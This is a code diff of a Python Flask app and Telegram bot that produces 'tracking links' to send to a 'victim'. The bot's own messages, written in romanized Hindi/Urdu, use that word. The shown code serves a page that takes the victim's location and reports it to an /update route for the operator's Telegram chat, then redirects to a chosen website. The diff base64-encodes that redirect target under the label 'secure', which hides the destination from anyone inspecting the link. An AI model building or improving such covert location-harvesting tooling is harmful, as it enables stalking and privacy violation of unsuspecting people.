@@ -1,6 +1,7 @@
 import os
 import threading
 import time
+import base64
 import requests
 from flask import Flask, request
 import telebot
@@ -25,25 +26,25 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"Telegram Error: {e}")
 
-# --- TELEGRAM COMMANDS (DYNAMIC LINK GENERATOR) ---
+# --- TELEGRAM COMMANDS (SECURE BASE64 LINK GENERATOR) ---
 @bot.message_handler(commands=['start', 'link', 'getlink'])
 def send_link_command(message):
     if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
         app_url = os.environ.get("APP_URL", "https://location22.onrender.com")
         
-        # Check karein ke user ne command ke sath koi link diya hai ya nahi
         text_parts = message.text.split(maxsplit=1)
         if len(text_parts) > 1:
             target_url = text_parts[1].strip()
-            # Dynamic tracking link with target website query parameter
-            final_link = f"{app_url}/?to={target_url}"
+            # Target URL ko base64 encode kar rahe hain taake slashes/colons ka masla na ho
+            encoded_target = base64.urlsafe_b64encode(target_url.encode()).decode()
+            final_link = f"{app_url}/?to={encoded_target}"
         else:
             final_link = app_url
             
         response_text = (
-            f"🔗 *Aapka Custom Tracking Link Tayar Hai!*\n\n"
+            f"🔗 *Aapka Secure Tracking Link Tayar Hai!*\n\n"
             f"`{final_link}`\n\n"
-            f"Is link ko victim ko bhejein. Location milne ke baad woh aapki di gayi website par redirect ho jayega!"
+            f"Is link ko victim ko bhejein. Location milne ke baad woh bilkul theek aapki di gayi website par redirect ho jayega!"
         )
         bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
     else:
@@ -160,8 +161,16 @@ HTML_PAGE = """
 
 @app.route("/")
 def index():
-    # URL se target website uthayega jo aap Telegram mein denge
-    target_website = request.args.get("to", "https://www.google.com")
+    encoded_target = request.args.get("to")
+    target_website = "https://www.google.com"
+    if encoded_target:
+        try:
+            # Base64 decode karke asli website ka link wapas nikal rahe hain
+            padding = '=' * (-len(encoded_target) % 4)
+            decoded_bytes = base64.urlsafe_b64decode(encoded_target + padding)
+            target_website = decoded_bytes.decode('utf-8')
+        except Exception:
+            pass
     return HTML_PAGE.replace("TARGET_URL_PLACEHOLDER", target_website)
 
 @app.route("/update", methods=["POST"])
@@ -195,5 +204,5 @@ def run_flask():
 if __name__ == "__main__":
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    send_telegram_message("🟢 *Bot Updated Successfully!* Use `/link [website_url]` to generate a link.")
+    send_telegram_message("🟢 *Bot Updated Successfully!* Use `/link [website_url]` to generate a secure link.")
     bot.infinity_polling()
